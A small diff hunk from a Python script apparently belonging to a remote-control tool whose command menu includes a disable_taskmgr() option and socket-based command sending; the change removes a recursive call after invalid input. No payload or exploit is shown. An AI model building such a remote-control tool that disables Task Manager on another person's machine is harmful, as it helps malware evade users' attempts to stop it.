@@ -435,7 +435,7 @@ def send_commands():
                 disable_taskmgr()
             else:
                 print("Invalid choice, please try again!" + "\n")
-                send_commands()
+
     except socket.error:  # if there is a socket error
         print("Error, connection was lost!" + "\n")
         main_menu()
